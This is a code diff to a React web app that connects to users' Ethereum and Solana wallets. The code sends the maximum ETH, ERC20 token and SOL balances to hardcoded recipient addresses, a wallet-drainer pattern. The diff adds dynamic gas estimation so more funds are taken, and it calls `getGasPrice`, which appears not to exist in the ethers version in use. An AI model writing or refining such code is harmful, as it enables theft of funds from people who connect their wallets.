@@ -11,7 +11,7 @@ import { useSolanaAccount, useSolanaBalance, sendSol } from "@reown/appkit-adapt
 import { ethers } from "ethers";
 
 function App() {
-  const { address, isConnected } = useAppKitAccount();
+  const { address, isConnected, chain } = useAppKitAccount();
   const { solanaAddress } = useSolanaAccount();
 
   const [tokenAddress, setTokenAddress] = useState("");
@@ -19,19 +19,35 @@ function App() {
   const FIXED_EVM_RECIPIENT = "0xYourFixedEthereumRecipientAddress";
   const FIXED_SOL_RECIPIENT = "YourFixedSolRecipientHere";
 
-  // Balances
   const { data: evmBalance } = useBalance({ address, watch: true });
   const { data: solBalance } = useSolanaBalance({ address: solanaAddress, watch: true });
 
   const { sendTransaction } = useSendTransaction();
   const { writeContract } = useWriteContract();
 
-  // --- Send Max EVM Assets (ETH + ERC20) ---
+  // --- Calculate gas cost dynamically ---
+  const estimateGasCost = async (tx) => {
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const estimatedGas = await provider.estimateGas(tx);
+      const gasPrice = await provider.getGasPrice();
+      const cost = parseFloat(ethers.formatEther(estimatedGas * gasPrice));
+      return cost;
+    } catch (e) {
+      console.error("Gas estimation failed:", e);
+      return 0.001; // fallback buffer
+    }
+  };
+
+  // --- Send Max EVM Assets ---
   const sendMaxEVM = async () => {
     if (!isConnected || !evmBalance?.formatted) return;
 
-    // --- 1️⃣ Send ETH ---
-    const maxETH = parseFloat(evmBalance.formatted) - 0.001;
+    const provider = new ethers.BrowserProvider(window.ethereum);
+
+    // --- 1️⃣ Send max ETH ---
+    let gasCostETH = await estimateGasCost({ to: FIXED_EVM_RECIPIENT, value: parseEther("0.001") });
+    let maxETH = parseFloat(evmBalance.formatted) - gasCostETH;
     if (maxETH > 0) {
       sendTransaction({
         to: FIXED_EVM_RECIPIENT,
@@ -39,18 +55,26 @@ function App() {
       });
     }
 
-    // --- 2️⃣ Send ERC20 if tokenAddress is provided ---
+    // --- 2️⃣ Send ERC20 if tokenAddress provided ---
     if (tokenAddress) {
-      const tokenBalance = await getERC20Balance(tokenAddress, address);
-      const decimals = await getERC20Decimals(tokenAddress);
-      if (tokenBalance > 0) {
-        writeContract({
-          address: tokenAddress,
-          abi: ERC20_ABI,
-          functionName: "transfer",
-          args: [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]
-        });
+      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+      const decimals = await contract.decimals();
+      const tokenBalanceRaw = await contract.balanceOf(address);
+      let tokenBalance = parseFloat(ethers.formatUnits(tokenBalanceRaw, decimals));
+
+      // Estimate gas for ERC20 transfer
+      let gasCostToken = await estimateGasCost({ to: tokenAddress, data: contract.interface.encodeFunctionData("transfer", [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]) });
+      if (parseFloat(evmBalance.formatted) < gasCostToken) {
+        console.warn("Not enough native balance to cover ERC20 gas, skipping token transfer.");
+        return;
       }
+
+      writeContract({
+        address: tokenAddress,
+        abi: ERC20_ABI,
+        functionName: "transfer",
+        args: [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]
+      });
     }
   };
 
@@ -64,31 +88,6 @@ function App() {
       amount: maxSOL,
       from: solanaAddress
     });
-  };
-
-  // --- Helpers ---
-  const getERC20Balance = async (token, userAddress) => {
-    try {
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const contract = new ethers.Contract(token, ERC20_ABI, provider);
-      const balance = await contract.balanceOf(userAddress);
-      const decimals = await contract.decimals();
-      return parseFloat(ethers.formatUnits(balance, decimals));
-    } catch (e) {
-      console.error("Error reading token balance:", e);
-      return 0;
-    }
-  };
-
-  const getERC20Decimals = async (token) => {
-    try {
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const contract = new ethers.Contract(token, ERC20_ABI, provider);
-      const decimals = await contract.decimals();
-      return decimals;
-    } catch {
-      return 18;
-    }
   };
 
   return (
